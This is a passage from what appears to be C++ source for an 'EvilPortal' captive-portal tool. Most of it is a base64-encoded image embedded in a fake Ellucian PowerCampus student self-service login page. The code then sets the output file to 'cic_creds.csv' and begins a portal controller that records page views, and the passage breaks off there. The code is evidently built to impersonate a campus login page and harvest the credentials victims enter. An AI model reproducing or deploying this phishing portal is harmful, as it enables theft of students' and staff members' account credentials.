X3qaGPLk6fF8QYYaSTgHI7j1/tRx+BIsXlEiW8ZsheTeY62Bwo57532JrTBdPdG+NpR6Ea26fPbpMlqSXJVRDGGJP02rXlNeTbjCS0iGnTDITqt44lAycjUfsP71TyUZxxW6BXvTIkgSSFFIPOef0pRnvZpPClHQLoUbwdRiZZCuiVHyCRwfbf7VcnaOZLtHsPxV0uIzWVzDdCVEYOVlkB1KzbYU+2foK5s7jClyQ4ybtGi6H1qINKLsxLCAGgk8Mq2kk7Ee2wrf60Y25dEyxrwaWORJEV0bKsMgjvXRFqStGR5B/rnfvLc9P6SjhVK+IdRwupjgE/QfrWcnujeGoX5PH5Z7231Dx3HhkjBbIp8YvwTckuxkfV7+JsrcMfYjNH04fAlOSNBa9Z/3Dp8sTppl06SOR86wcOMrOmGXkqZTR60OFOexHINbGI+RonUrKukjY4/nSoeiMDoBYNnSftVVZJKF6NDISDqXB96mi1LVFt8I9K/3C+/E3JK2NqQZCeHPIQfzPt864/Xeq+jDjH8T/AKfc6fRem+vPfSNNcXvizto/6Zbccat68aOOlbPo3KywnkVBHoVgQOPSudJspFz0Xqs3TI/Hefwrdv8A7bbiT5D+teh6J58crj+H7nmevWCaqS9xZr1odWjeNxbpG2xjZNeR75r05eolI8hYoxKHr3w7D4T3VrGhYL5hCvmwO4B5rOlJDezw1EORmvUOEkJtSQBQ23FMDmBIx2oAjsvIPIoAQEjmpAJG5jdXQ7qQR86TSaphH2u0XfX2SeSzul3EsRzj24/nXH6JOHLG/DPU/iTjOUMsf9yK0lBGc5BHpxXeeaWvw7AQlxdMNtOla8312S3GCPZ/heOoyyP8ic9sWCun514B71jjzcZHX6j0yyQo1nSUtbqysZLeJVnvYAXkByA2WG6n5HPFdGWNyaR4+GckgXW1fp3h+GEZiyqw3wfKSfl2rKFtuzux5pPRbfDdrBfLdJewRyxFEyrHIzkn+laJaJ9XK0kD6r0awiJhtb1rbzHPiYZNRA8pbnjG2+M1yyhBM4OJlLXFhfHxFSfw2OUG6tjOw+w37CrbjPxonkl4IHVJFmmZ4/LjCgFi23HJ/QelVjIeyplidkOldi2xrpxtchUbXpnR/A6ZbeDOFBBeaPABkYjbcgnbbim522jsWPjFcS5nvOo28cEUID6RiVz64JwNj7Cs4pXsuVrpGH+M0Rr1LhYfCkkQGZcYOrfcj19a6cLtNHLnik7KayijWaN7gHw9QJGM7Z5x/SpyTbTUOzBIuurdYnvYxAWLwB8xmRd1yMEA9hmuLB6eON8qpvuiiivrppsRZGhGOSDkMfWu/HjUdisjxxvLLGkaEs5CL/3EmtOSBK3RcHo15bXEUd0nhrIwUMDn/OahZU0avBKLqR6BaRP0218LpkQSPYFlUFmP8Rzz+tcjlydyOxQpUgouOs3HRLuCeGCdpE3hMQ1NH+9jGPMNiMYq01ejOcLhs871OBI2gnzbgNyMVFL5OEVwCSquASw05P2OPSha7EwLWMlyZJp5gCo1FUQnAz6dvWrWZQqMUMhyo0MpjkG47+vvXVCakrQEvplrcX03hWkJdu5GwX5ntQ5KPY4wcnSNVH8IzwL4st/bpIo1Y0nSPmxx/KsXlUrjRt/p3VtgLRoCfCk16lJVhsSPXHYjkb+orhcUnswNb0u86fbyO2mWFJI1/wCmWJOlhjUoODtg529q0x5Iq29C7Lfp/wATQr1KR/EAjfxMwNrflgWbABOCNwvAwd62x54OQcTWdE6nF1eyd2SIxCRo0AB3A9QeORXTjnzVibaZB6l0KFLe4l6Sz28rjJjRvKwA/Kq8AmlLEkm0aRytfi6Mbc3sHTrUkwyfjBqLjxNiSdww/tjmsYY/qx90aRpPNfRjri/6h1KcSLKg0ACVVXB559tq2lCMY0kLHOTbHWlvIJAJGVgzaclgMH3J4G43rmk0vJt9WEPxs9CsbWHoHT5ZG80unMj8Z9APb/5rqxx4qzCeR5GZi76rJd9TjvVmkUwKVgA20Z/M3zP6CvP9V6nn7I9Hqem9IorlPv8AsGg67HZjR0uAKxOXuZwHkY+3ZRXHxs6Xjc9zYzqRsuvrou444LxhhbobZbtq9QfXketaQm4afRzZ/RwmrjpmIuFdJWiuWiV0Yq2U75rqVLcTyZRcW0wRYGQgKCpb8qnOn0NFaIZoUvLSKwtVbxZWG7hP3SScAHgY2+e9Xi/DR2YuKggtpcWkcWi2RVUfuAYxTabds1TSVRBy3CjXpVfMMHtQSpU7IkuZzqKKkYGFUHP1NFlt2QPDNvLhd2bdRnGce9ax2jncT2Xptnb9a6NHdWKfhpdIxEUwqOuNvXGx375rB+lx5YuUe/7UYKfG0yX1bqU3SoWn6jZQywAKPECgb8Y2++MbV0Pkl71ZeOMZLstui9bs+pQn8J5Qn7vbHt7VrjnFqkZzxuJTfHnRendasVkvdCvbhmDtwVI3U/YHPbFOXyEG+j546nCgnKRuGVTjI70o9Fy7K8xHJYDbtVGdBLaZ7WfUnpgj1pNWOLpk+BdS6s7g7fKs26NFsDeAM2pMb9hVAQwGwcVSM2yTYdNmvJ1RNlGNbnhR/nass2aOKNs6MHp55pUv5m1jlFtYpZW+VgTfHqe5Pua8OV5MjyS7PosUY4ocI9CQnVIuBk5FDWi7L5jFayvcXzK82PJbcgf+f9vvWmH02rkcXqfWf7cZVXF7JcTmW4cnfiu1KtHlOTbsBe/ED2qgeIw/hjQ4P/Fa48LkTLJRTXHxL1acgLezRp2RHwK7I4oR8HLKcmZbUBQQKHHrQA9HUjY706AMDttTAG6jOfWgATDbNJgNAxup+lICR+JdoY4nOUjJ0+ozzUqKTbXkt5JSioPpHZLgBeScVd1sF7tI2FtH4dpDABjIDN8q8LJLlNyZ9ZhhwxqKA9VuhawmOIE3DrhVUZ0j1NaemwvJK30cfr/VrDBwX4n/AEJnRbL4gsunWl9064QR+YJDKAwyCc4B/vXpTcU/cjw8fKvax/VOsX80yJ1mwa2eNiWeNSyk4A45HHvzWaxxf4WdEMrg/cjW/CF/aSwzCC6hkYsMKrDOMenPJqOEo9orLlhkriE+JUtP2ck888UpJI0ZYHAIwRwOeeawyxi1swdGDupPFdyEwpXOVzgeg37VCi0ZlacZOtsnGrG6jA963SYCyyZgbw21qBgYq8UfdbKXVmrsFjvbWCWNpPBZSG0AMRwR9vbFFU9nZF2idFJNbyFrfeME5aTIJPuCT980pMaZkOr3X468uGYhwCFBHqvP61rGLjE5cj5MrWVgBkg5Axvn/OKzVWYnGKZwq6WCnK43wPX5VrBOTpMiUlFWw9pbGKfw0iTxQhfP8IGcn6AVM4ynFuwvrQl65UeMnmeFwyHjzDfPyrPBfKvktPyjVJ1O16n0zxGikjkdUDLp2yNwdVNxcZaZ3uanGywsLyaCIBGU5GADS3ZSkEmu54IzdRXLRPFu6s25+mP5GqWiZTrswUr65HkZT4khJOnsc7/SpPO8jA5GRqyRtud6KAJJKwtpQHDPLpUjf19fpSgrmtdCXYk9ohKCZShBbLfxAHH860xza2jRKzRdNEwxH0xAiKQNCSaT653779qcqvZ1Y00tFo0NxJbOl7ckSRkO7Kden/kbVH+6zWm40Ud2beO8njjklMOUcuHx5iNz9T/Opkn2jhyx4yaLCKezBSXLFi3hka9gpx22/wCKwkm4mYkF6bW9gnkWVlBIBRiuhT6MvHI3oxtpaAv4PiR0s1g1JaWwYZW32Yt65HOeTmtlna9iVFQim9lZ8S/E9/FZPdQdSfXHIEiGfMcrjtsANIPrnJzWmLK55ONiaoxVt1nqBlbQRcGTcowzq9eO9dkmlthGEpOo7LTo/W1sOtWvUYV0qT4NxC3IBGP6/pUyXKIK4yplv1O5t4bq4u4D5Dk5C50A98exPFednw/VjQerxfVx/kCl6s9zZJY21xJPaw4Uysc6zzpHsP7DitsuRwgoLt/2Ov0WFSXPwiLJMSfDDEn97H8q54YW+zuyepjHS2Hj8QJkIoGPWtVgijnfqcj6dEhJPD8xcL2zirWOPwZ/Vn8g+t2sF305r+3uIpLmJv20UUgLFONensRwfY+1P6aq0jnye535M0HXRuDpbA3GGBB/lzWbRgi4+GLZ7yV7dgvhD85kwqn03Pqcc8VEl71ui4PdoiyyK7alVY3GxRcbe21dLVaOm0DMjE41UgJupYrYs5CqBkk9qmrLT1ZChtHu7jx5yyIfyIDg49/Stk+KpEN2Xlt8UzfDCmOxlJlfcxaiVHuQc1cOTZjk4+eyW/8AqXL1ONLfqnRoZUz+eKUowJ2yMggVo4qSpmUZyg7ibT4Z6lYzXMTdNXw4nj8N4iFMiNyNXff13GaxgnCdVp+Ryycoq+xv+oV94Hw9eZcq8g8OPHctWk2PGtnhE6lH0sDqwTSi9Dadgs+UbcfzqxAnUE7UC7Jtkw8EnPmT8wFZTRpBg5jHJlo/KceYdvnVLQuwNjby3c4iiG3djwo9aMmSOONsrDhlllxia23jjtIBDFwOSeSfWvFySlllykfQ4sccMFCIqku4VQSzHAA5JpKI3Kuyekq9OU6CDecaxuIvl/3e/btXTDFW2ed6j1Tl7Y9EEysSSTvW6VHHZX9R6msC6I8NKfsta48fLbMpzUSmacsSz+YnkscV1nO3YxrqIbsxJ9AMUCIS4B3A371IDtAP7ooAYyAHkg07AfFKV2PFCAOSGAI9aYAsbGkwBlQvypAdozupxQOhya4yG1aSOCDvQ1Y1raJ3+83pjaLxQWbmTHmA+dYL02O7o3n6vPkiouTob40jQqrFtR3dySWbPrXQopdGDduzQWl11Dw1mtb26iGNRjxrjBGxOnO2/O3espr5WjSH5hpuqdQupkmuVhuGQEYhOljkkk6T86x4xfR0QySgtqy4njg6fZJdzRiJ7yMxSofLhW/iPGRyPTFOpJaCbg7daA2vTOoXcTC26lHdRJsq3BMgxk4w+xHHG3aly5fiiYqHwyPd9L6mkUkk3TrhY031xDxUGPTvj71P0L90SXrsqJoHY+I4GCv5jsMcf0+9HCS0OKvYGVVS3ZRxj9TWkdF6ou+lRzxQxzdOuPDVwC0bHYGpk9m0U60B69f30dsVeYAscYU8+u9OEVdkZJSSKS32jXSMfP33rR/BmuiVLbT2rhLmBU1EECU6SVO4Py9+KxlFp0ZhniWEbPH4ioS0LZGVwfXahYsnYmQXuzHLlSTIY2jfUuO+fr9a1jjdNSBvYISPMg1HOP1ptKOkd/p4p47XZoOjETWLxgHKnFZTWypUtIIk724JxqAO4OxFFJmNtBOp9UhuOmkTpNHqAUOVJXfcHA7YqljkyZZFKLSKXwmS0SeKaOa2diuoEjDAflIIBG2KmWJp2c0Yyl0gPm0hlHPqvf51HT2DTXaGzgyIqqDlmwM+o7fWqx6bJRpDZK0ds7JnVGOe4I/+Kxc3yaO2EI8UCnjfpsiZ1pG58rjsfQ1UJ8i+Sh0TIAphZ3jLlgQJhJpAHuByaspfNkvqHSI57KLqFkmpkCxyxjfbHK+hHB55ziueE3bRzZobtFdLOi5he3NqzRKNHhBdQBBB9yTvq9yPatZOXk5xbKa3eeWGX8TESpDNHofI77bD5nb9KcIxbAVunoLlgZnVQyhShGc+vYb42G3zqXH3a8DohfHME1lFZQXBhZiRvG2cBRpwdvfneujCoKTrsbqqMgrEZ5yK6GR0wz3E8qDxHLnHLbn71MYKPRcsspL3bL6x6zFcQeBM3hzacEscBvrWUoNO0aRmmqZIZ4YYy08yxR5/Kvc/Tmp4W7rZfNqNXogy/EEcWVsrXPbXKf6CtFi+TJ5fggz9Z6jON59A/hjULVqEUS8kmQS8k2TLI7n/ALmJqqRDbfZY/DhMd+WTkxOP0rPL+E0xfiJErxiVhbzBo1OViJ29xn71ytb6IlV6Lv4d6beXcT3UMaNBG+D4raQ55xn9D86znBP8XRWOLbKeePXfI0Vm1qjyCNgNRCnk/m42B+3tXZDi9XZpNTgrF6jLDaukltqZCSDrOc1bgq0KE97CW0jXirJIpES7qp/ePr8hWVVo05claEvOqJArJC2qQ7AjcA1UYO7IlOtIoWlYuxzljuzE7/U1v0YN32LEcjL+b01GhC7LXp3UBAQTIEMe6yRrpdT7MNwKYqNW/wASN1fp1pb9TZbh7a5jm8U4Bni3B1DjUCQD61lM2xeUV03ToLnqVt+HiJE2otncgb8/eubI5OLUTsxcFNORluqWxs7kxhw65wCtdOOTkrZzZIKMqXRDLqO9WZCq2HDoeefrSGSY41fdfKT2qJOkXFWy7s447WDRGOd2Pqa8zLKU5Wz28EI4oVEIGaRgq5LE4AHepUS3PyyQri1yEYGU7Fh+77D+9bwx1tnn587n7V0R2k7k1qcpXdR6kIQY4TmTuf4f+a2hj8siU0uiieXOSSSx5roOfvYwliPShMQzG9MApGRipA5crseKAFfjNMBAuRuKAHRqQcA+WgBe1MBpG2DSATSV3U7UAdgsKEAWGHIx3O1MCS20wx2NA0Wks1w0rRRyMsZTUwB5P+AUATbe6e6hE92MJCwfOjTkj0P+c0kkvA7LHplxcSQeLOiyLKCSJFDKQeBg/esJu5WdWOPsSZJhneKVmtY7KBwoYCO3UFuxOQPrjNVBOW30TlcYaiiw6F1q6Sa5ineSWSLDIZDznt6AemK25OjmpUVfX06f1CB7jpyCCZj408JOx4GV9jyce/BrKfdo0x9UZW/bGEHc71K2Wyx6b1RLTp5DyANqIC8k/IVMoWzSM0kU3ULyW8m1sSFz5R6VcY0jKUm2SLQYtRnYggfrUy7Kj0X951uPrD2im1lkjstKKFj/ACqO5PfJ3x/zWzptMw8kXqskd8ySxxXEF1Dvq0du23P1H2oGUl0NLj8g1KGGhgRnvj0+VAhsJxsDsaUjs9JOpcPktei3n4O4cMMrIBjB4I7/AC5rOk1RpmuK5LwW93PF4PiyBQh3D4zn3wKzhBt0ZTyRjGys6+EF3BajCH8PoBfjB1c/XFdTVM4MTbTb+Q3wv02C4hhgvpR+HYzSSoGIbbSFxjvkg0jbaZVpbT2lxNFco8YY6U1DSc52JB9v51lOKo6ca+rGXL9PzLv4esbC5uw1/I7KELrGh4PAyfrmsJKUIX8nPijykX01wkkURUKukKNKjYVyu7O5R1RGv5lm1RMGPlA1AZx8x3HFaQVIxydmadGjm1RooIOQEclfng1utozTZZxXrzWYtpJGWPiVl5C/wj5n9KyjDjPkdeOP1I76LuPq/ieHDdW8cloi4WI/mXtnXyD8sCtlka7Hk9PGf5lP1S4PSuoGXpbJiRFeF9GGUZP3PINOWO5KtHEoJafgDdfEF9M/jo0TMTnW0Kkge23+bUo45V7mUuNFN8R9TvOpeALyZZfDDFdMYXGcZ4+XeuiBnkq6RTcPn+IVRmOXigBMZagBSg9KAOI3NAHHigDl2SgAtps+M4yMc4qMi9oE5dnDDJVd32w2O+fWueK5OmI9I+HPiDpPVbJLSBBaSRppFtqwFHqvqP19a0lCjaEtUB+KLFP9sdbcqHWRZWVcZfYjPHODWePGoZORpOTnGmeaX0iTTDBIiXYdj711s5wvj3V5+wtoykYGAqenuah8YK5FxU8mooZLaxWqEzzBpP4Izk/U1KySlqK18s1lhhjVze/hELGTgAb7kVqczH5bPloA5nLNuc49aALewjZumibIC/iQir3by5P0/L96znLdGuJOm/yJn4mQNIYSVd/KSvOn/P51kjd6OleykjMLR62xh3Xk+gUnj5800ndicklRnb2ApM6IAVU48vB+VbJmDWyIcxtpHbmqJei7isjHaqWJ8QjUR6e1cTz3Ol0egvTVit9hrSRpDo5Papyw8o1wZNUyZ4oiBCHz92Hb2FEMdbMc2dy9segRcAZJrSjmsq77qgXMductwW9PlWsMXlmcslaRUNqY5Jrda0YsRU3yaYCudsUAIBQATtUgdimAhz+WmA8CgBc+lAHHZd6AG4z9qQBABimOjgMmgKDx5DDHb1oA4/8AXUA96ARpLGKPS0jgbbc84/pQBBvLv8dOLWBiUzl3A2OPQegqJSpWOKtljb9QubO3lUvG0RXzr6ge3rXOnbOrn8hOiSNdGUyYEkzBsDfT7Y7AV0rSo5m72y3MslsWBYAlSC4X225oEZa4H4ZUd2LHlFPvvn5VMt6NI6VlU7l2LFsk96XQ7JS2Gu1E5kjA40ZOo0uRXB9kKQAOQOBsKpEMka9MQGewqR3RO6bPqjMaN4RDHsfMfU+vyrTwZssbSCOEmRdMkx5klc5+w4oEJ1Dp8l8sZZ4PK4yyAhgDsdzzQBUXvT26e4kRjLb6s68cfMdqGXjlxmmJI7QzpIuxBBHzFZxdM9TOlL8mCub2a4BR9KrndV7/ADrW7PFWNRdDPEuLyeCNpDI6aY0LHtk4H60my4Rt0i3tvxNmZltZ9LI/heIuwJbP9AT9KLqNm3H6uSo+SLPpe6SAMMbDJOSF9T7nn61EVezt9RkjiioQ7/f9Q/gSwXEt1FKqxkaHXUAyjbHc4470TjyVHn45OLJEdy+oM7Y0b41YJ3x/hrJYkbOb8DfxgLu5dS/cOds/024+Zo4LjSM5TsBLdm4mxLcLEgHmLNqYewPrQotbHCm9ukETqNlFhFY6F3UBSd6n6cn2df8AqcUdLoc/XIVDCKOR2xgEjGPen9JkS9ZHwgJ6m13bx2phIKMSjlgdjyvHBODV3xRzT9QpO6IEdx5jpC6Tvu2AP0q6GmAvWLyjJQ+X9w5FVHoifZFx5PcGmQKtADlHmoAWmAh7UgEPegBD+WgAsH5/v2zUz/CBK1KLScryy6d/pn/PaljTWwIZYoylCVIGQQcEVoBJuuqdQuoRDPdzPCvEeshfnikkl0NybI9uUV8yIW9s4/Wk02tDi4p+5WGnu55E8NWWGH+CLb7nvUxxRW3tmkvUSa4x0vsRHOSF7CtDAdGM5Pc0hnO2Nh96AGjc+1MC96LcQNB+DvGZI0l8VHVckZGlgR3GAD7YrDNFtXHs2wz4tp9M6+g/DySLHKJoWOUlTdSPf39qzg21clTNW0uiCH8GMN+Zs4APGa1MzpmeZwNySMkn3o5JDUHJ0Gt7CNJFdwGxvxtXPPM2qR24vSpbZYsuoFnIC+p4rmjFvSOmc4xVyIT3MEGso2NXLHmu2MG1s8vJlVuuiFL1RFB8PLn9K0WK+zDmQJbua4OHbC/wrxWiil0Q5MERimSO70wONMBmMmgBcUAPHpSAQsFHvTA6MH8x5NAD8+lIBpIHNMBeTluKAFC6vaigHZ0jByR7UAPQq35SKBosul28U2oy5O4GFbH1oAjTQ+H1IxjJAbbPpQCH3t7PlrZH0xDkAbnPvSGSukxiOEucan4+VYZHbo1gqRYSwCe0lMkyxRqPMTucewpY1sJdECD4jv7GLwelslpCDnyoC7n1ZiNz+grcyLK3+KusLHpnuYp523WGSANt6HAzQBWdU6wvVWV3tIYJQuk+ETpPPapcadlp6or8YPsO1AyU8tvDGnhTvNKwy4EelUPzPNFApOyHQBzOSuPSihMfBKxfR4mnPfNUiGW0NpcFRIJ1098ZzQBIWRohguT86ACGQlCFGrbG2/3oArL+1ubeFZJrZ0hbBilA8pHoTUuNM6see48X4IRiLx64mDN3TuPf3ppkzxOXuj/IJZNJaO8+NMgGlAw3yeSPp/OixRg4xbffSBJcNA7SltUh4B3APrQ96HCX0bl5G2ZnnnEceWkkOc9ye5JprRg227ZfxWJtoZY2k0ErtIozv60xEGa0fwSba6Mun/qLq8wPypAVTE582SfelQhA1FCoQuf4SadUMXUx4wM0B0Kpcbh2HyNAHLq333pFWIdzmmIQDkUANGxIoAcvNADzQAh4+tADGoA40APjYo2peaGk1TANq/8ATlfbFAEZuM0AOQZz86AOIxvQB2fLk0xAlyfmTSGFyBtQIQBfWqEIzaTgCgCVYr5XkfOcYXHb3pPoaOiu5UnCSOMZwWO1Q4otSY+eWETaYsuBnGrbPt86niy+XwEhvoFk1zwPpAAIBBNT9PwivqsW663CNrK0IH8UxyfsNqFgT7H/AKqaVJlXPeXNwcySH5CtFCK6MZSlJ2wGnPJyaok4igDlG9NCYrc0CFoQCHegDgKYCkUAcWwMCgBqrk70AE+mKAEJ7DmkBwG/qaYBFXuaAFoGdQICrmOcOh0lWyCKBouLC+QOdaAM37yHGfpxSsAk5WS6MuOPWgEVuDNdldOrLdvSk3SGtsvMgsMAYB2rmR0AerELZAZwWYDHrWkLszmVGfD/APPt7f8ANamZLht5PyojEneV88/9uf5/8UAR5oDbuodlJbJOO1ALs7Oe+dqksao2JPfamJC8EChDGk43piGcGgRO6f1BrSTzZaM/mFAiW90Lti+yRr2PYUASrIIxBfAQHZfX3P8AaqRlOTqkaKDqjhPDYoyYwVYZBFE5pIMSlJ/YhPD0lLl5orJBMQPKd0BPcDgVg5M64x+Q46X0WVtZhGo8hGKg/JaaaG3IhXHwlZs4aG7kjXO6S4zj51VmTTZMj6f03pdsWjRQSN3VyXP1P9qLFxZSdWuPCk/ZZZHGVY7Z+lUheaKdJ5I5vFjOG/Q0ADuB4jtKF0hjx2BoAGPlQKzhueKAO7e4oGOBFAHDuM7ZpMDmpgN/e+YoAY3O1ADk9femIuLe1hlsFW5tZYJAfLcaCNWfXOx+VQ209GsYxkqemQbyymtV1OA0Z4deP+KakmTKLRGgjaedIY8anOBqOB96b0SlY6eCa3cpNE6EfxCgOhowBzQIVnGAoOQO/rQCBsaBk2zGIs43amKxL3AVSFAPBxRQyGT5TSELHgDJ2oEhQVPBoHYhKj1qhDc6j7UATWSaONFTGBvkUmCIrRudTMDzuTQMGR60UIbkqQefnSKTFfSxyqafbOaEDG4oA6gBDTEzgKYhH5pWAgODQgHUwFUigDuaAGBT60APjGnJoAXJPagDgPagB4oA7JNACj2oAdigAWkaifegDgpBypxSGT4ZGaJA35nOke9O6BdlgIYkywUAnkgbmuazZKkIskeQPDbBOFPGaEhKRB6hJquCM5WM4UH171rBUiJO2Mt4CGDvs3Kg+vqaoRM/FxRALq1j1A2oAgX0gklUrxjamANDsfakNHLnf1PFIaFQ45oAGRvTJOzuaAEyKAFDe+1Ah6s64KuwPzoCkHF3c7ETMDSpMcfb0TLPqM7SgSuCFIzk4qZRotSLJL8YUtv5ySeKijXsJIWlhM0Ep1AZIztTFZTXPUZ2VlPHGBVqBm5+AE14ZIURgfLxTSoz23YHncUxiMzaCoOx9qBCqAV35oEW3Q+nRdQadJcghBpccg5/WqS0BHveiXtnG8skaNEp3dGB29cVI0QngkjAZlIBGQe1AxIxljntQwQjcUwGehpAKysELAjSTgjP86AOhkMUiSIRqRgw+YoBaNDaTx3dowuImndjqIYnArJrizVPkgokV4mjMahMYZM6vpQU99lbZdNtmnIlnKkn9mOAPmeapyM1FFxZC5hbTL1GNkB30A5P32qdeC7b7R3UelWl8xlUiOXuy7B/mPX3qlKiJR+Chuuj3UBGkBkO2dQ2q00yKaA/7dMR5mjX65oESTCY0wrgEbA6TVCEMdq6ATSPqA5UAUBYAWsHhMRKXbsAMCigIzKP4RikMbt6EUgoTamgofAA0qqB3zTEWagnc0AI6qVKsdjSGisdCrFccelAgTHtSGIBtQB1AzqBCU0AtMQ1qkBO1NAJudqYDhsKAFBFADqAOx6UAdhh70AOBBoA4g9qAOoAVdqACxAO2Dn7UAAzgnOD8qAODgb4zQBYWoRCJdReRhnOn8o9qylJ9GiSDPMwGFOpvTFQlY26GuzfnGNQ3wBvmrUSb+CD+IuBI8ijG+SdOcVaQhv4qVjqZskHNMCyCLdR6tt+dtzSABLYkEeFkjuGxtQAC4geJQWG3qKABBjwdscUUFnbnb1phbE7GkAmOaYgmB6UgGlcbigYWJRjUaTCh7x9029vWmhgyF1AtlQTuPSgRPS4iz4TKMEeVmqXH4LjK+yR08vCso1bswCgcUmUkQb6EJcEJnQ24qkzOSpkWbbFNCGoxUEfagBTxtQIeh3NAI0Pw8DFC0h4dv0H+GrXQi7keOaIiQL4R5DcEUgKabpsupjA/iKezkDA/t7UAVctqYZWaIqHAwYyRSYytO4oAbSAQ0APhjaR9KDJoBEyJms3KvISNiypn+dJxsqMqDjqMaZPBP7oHFSostTRFe8WR9ZHByBVJC5WT0uNSBkxpPG9ZVRdi/iCKAs6W5kdNJPlpisDHeqJGjmxjs/9DWqdoycaCPNbN++PoaokjyG1I3lA+lIAHhx8xSSfMRmmAKQpgnUS3/higAWc0h2KEYgkKSBzgUxIW2ZhIWVC7AYAAoAkZmY/tZo4V92GftQMlW1tHI2EEs7YzupxSsR12GgGmVGjzwCMU7GVkqDSWH2oACvcUgFpBYlAHU0AtMQmnPAoA7RjmkgO044FMBN/SgDsmgB1ADhQAooAay9xzQAiuRzQA/IbjmgDhQBJh1op25oGNWFSPL25Y9/lQIkwwRADJBPfPf2oAL4Cow0atHGAeKhxKTGqEVm05Pz5ppUJi8nc4HsaYDhjgDagBk0CSjdVB9cUAQkae3cxK2kE7HGRQCLG3hvJwSjoxH8S4FTZTVIg3FxIS8Fwmhxtt2NUSASMka2OlfU9/lQAq4J0swVvfigBGQqN8b9waAGd6ACUAcTgb0AEQjRipGEVsrQMkW8InidAQJAcoSKOhFbIG1nVnI2OaoRPguwFJXylEwoPc+tQ4mikDmlDhD3VADmmkS3ZFdtTZ7dqaJGg0wHZoAVTjvQgLW26qkNsieE50jGxGDVWA6e/kuVyWGjsBwP89azk2aJJLRZWNy62sasSSNtu3oKpdEPshdb/AAbwl3Ki57aeSPQ+1MRRupRypOe4I70gG0Ad8uaAJlrJHbowkYB87D+tFCGTkF9Wcht85pjI7b0gBkYoAJFPJEpVSMH1pOKY1JoU3MuPzfpRxQcmNEsh4dvvTpBbGlmJ35ooLFBLHA5piJ9rGkWSWBkxv6igQfxpGHkG38THagByn1cmgBrpE35kUn3FAEdoAp1RFkPscigYN9RBE0epf4kO9ADLa3ElzGLdgx1jZhuKQGtjlSNdKev3PvUlcSL1B4Zk8K4U6G4PofUUuiqVGZvbZ7WcxscjlW/iFWmQwFMk6kB1ACqpc4AyaYEhbbbc0AdII4R/E54FAAl82WY7mgBrYoAafagBPmaAHCgBRQAooAWgAbLQByjG9ABUGo/KgCRnK+Y7d6AGtL+4goAfDGBu3NAyWH2oAZLg7qBq9PWkICs4I43oGPEh96AHhzQAGcDOSN+QaARdWbaI0G2cVCLYK9is51aaZMlcAsDj70xUV91bR27B2HiI35WP8qpEgXhSceRtAH7umgADWsiflIYe1AAcEPggj50APJAFADCc0AOibBwe9AIKjbkUhkmO4VN9B1eoOKQwUrJNMXdMZ/NpOM+9MQrxoql4SWQc5HFAEVmLH2piEJoA4YoA4CgB2AKAHqRvQAeM4VSpz6j+1JoaYDWwckMynvgkU0INDINGk77+lADJNJI247UwBlULHGpR6GpAbBvMvzpgNlyZHJ9aAEXA74NADs0ALsaYDGTH5ftSAbQIfjSBg5oGKq5BJIA/nQIVfL5vTigYsLYcs24xk+9Ag6uTux57UxhVcdjQAviCgBpJb8rHNADCJef1FAEvpODPI7KAyrzj3qWCLJnVSfY5+VIsg9SulIVlbUAd8UeSlpDOoYuenLKMEoM5oJq7KmC3muGKwoWI57AVRmSB0273zFjHuKB0NW3QHDNk+nFAgyqqjCjFMAUk25WIZb19KABpDqOZDn5UAGEcYGNNAHeFH/AKAGNDETwfvQAwwR9v50ABFACigBaAOoA40ANIxQASOgBztpA70AJGcb96BhBIRxQARZGAyx3PagB653JoAQ6Sfy7+o5oERmlkjcjOcfrSGFjnVxg7GgBJJCAVFAE8M2VJYEqgZcdxU0aWPMyMSDgxyjDCgTRWyN4TNEzOdPG/FNE2dATuATz9aYgusL+ZiaAAXR1FW7cUARyc0Ad2oA4bkCgAmcb5zSCx+ragZwPegAuqSWMorMBj8oXn7UAwHhNoLEY3wB60uSuhA8GqsDvrQI7J7UDHgbZNAHUAFjRmGQ30oAeA2fNHq+YoAUpGNyMe1ADBHryV74wTUOVMDmgGNhvUqYCBFiGSGDDv2q1KxA5QCARv6kVQwJ2oAcDmgDs0ALkigBDg/OgQg254oGEUjAJ4H60CGOxO/agYsPO9ABtjyfrTEIyMNw2aAEGRyaBjg+OT96ACJJngk0AFSYxnOornY0mgWhzTS4I1k/1FSaWBZlaMo3BHNCF2Psps2skOckDYetDQRZNDi2t0SJQBimKKQ6eYogycE0horLh9TEtjPrTBgDx+YgfOmiWIJBnAGaZIQOe9ACtJpGTQABpnY7HHyoAczEbZoAbrNADRQAtAHUALQB1AHdqAHR96AGOctQAqkscDYUDCB1Xjc+tAHCcDhMn50AKZ9Q4xQA0TvnC0ALIfEG+A4oEBIKmkMeCWGc5oAKs+lQeSnHypUNMIJlYBdQAbf/xNFFWCmk8Rgz4GBjA70yBiyebPGNqAFLZoAQHUpU/SgBIcGTzCgAjqmeB9KRVDVXnBFAUhCOc0CEGeO1AhwyTQBPgYRR4B3I3pgRwNfOcn3qaQ6HL4K7NFuP4qKGkh6uhGPDX/ANtKgGyiF02UBvYbU26QmMWNRgYGxrPkxCiJRwd6ObAcI1Bx39qObAUKACCx5zmlybAUaR2BqbYDlYKQVUAjimm0wELDf1pANcKwwaadAC8DByDgEVXNgMa3J4IquYCfht6OYDfAbeq5oBhUg4IPOOKdoBOKYDlGRQARWRIxpXLepoENZy2QSTmgYyPAJoAfk/T0oEHCqOFFMBDpG+BmgYmfl9qABuWPc+woAYSw75pAcJm0BfTg0UFs4ykqRjBPegLOh3lUZxkgHFDAspZMTIG41CkX4OvHyBnjNAFdK/m/pTJbBEk8mmSPiU4JxQA8kKMmgALMWOTQA6Md6AFagAZoAcOaAFoA6gDqAO7UAd2oAUflNAA+9ABG2AAoAGaQDl4oA40xjo/zUAIPzfWgDn4pAIv5TQAlACrx9KAOoA4f1oAeKYCd6QCj/qfWkA5uaCh6f9M/OpkA4AebagQIc/WkxD4v7UmAZvzfWl4GNXge+qrQCy8L8qECETg/ShjEH5U+dSxMJ2qCRRQAg7/KgBO1Ax3egDj3+tADaAFHApAcKAE7UwO/tQAo4+lACMMcelNdgR8Aucj1rRMBo5+1UgGjg0wO70AIn5jQIUf9RfmKBkk0xDTQMGSfWgBoJ33NADe1IQ0UwEoAJD/1U+dAEu+/6if+VIvwEvfyfWkCKw81RAq8igCQOKAAzc0ADoAMOBQBx4oAEeaAP//Z' alt=''><div class='cap'>Students</div></div><div class='findbar'><span class='arrow'>&#9654;</span><a href='#'>Find Courses</a></div></div></div><div id='ftr'>PowerCampus&reg; Self-Service 8.8.3 &middot; Copyright 1995 - 2018 Ellucian Company L.P. and its affiliates.</div></body></html>)rawhtml";
    outputFile = "cic_creds.csv";
    isDefaultHtml = true;
}

void EvilPortal::portalController(AsyncWebServerRequest *request) {
    recordPageView();
